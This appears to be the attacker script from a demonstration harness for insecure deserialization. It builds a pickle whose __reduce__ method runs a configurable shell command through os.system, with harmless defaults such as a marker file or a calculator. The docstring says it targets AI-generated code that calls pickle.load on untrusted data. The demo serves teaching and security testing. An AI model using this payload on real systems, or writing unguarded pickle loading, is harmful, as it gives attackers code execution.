"""Attacker writes a malicious 'preferences' file.

This is the harness side. Not part of the AI's output. The exploit
technique (pickle.__reduce__ returning an os.system tuple) is decades
old and documented widely; nothing novel here. The point of the demo
is that the AI-generated UserPreference class in victim_module.py
calls pickle.load() unconditionally, so any byte stream the attacker
controls becomes code execution.
"""

import os
import pickle

# Default payload writes a marker file. Override with PAYLOAD_CMD env
# var. For a stage-flavored demo use:
#   PAYLOAD_CMD='open -a Calculator' python attacker.py     (macOS)
#   PAYLOAD_CMD='gnome-calculator &' python attacker.py     (linux)
PAYLOAD_CMD = os.getenv("PAYLOAD_CMD", "touch PWNED.txt; date >> PWNED.txt")
OUT_FILE = os.getenv("PICKLE_OUT", "preferences.pkl")


class Pwn:
    def __reduce__(self):
        return (os.system, (PAYLOAD_CMD,))


def main():
    with open(OUT_FILE, "wb") as f:
        pickle.dump(Pwn(), f)
    size = os.path.getsize(OUT_FILE)
    print(f"Attacker: wrote {OUT_FILE} ({size} bytes)")
    print(f"Attacker: payload command = {PAYLOAD_CMD!r}")


if __name__ == "__main__":
    main()
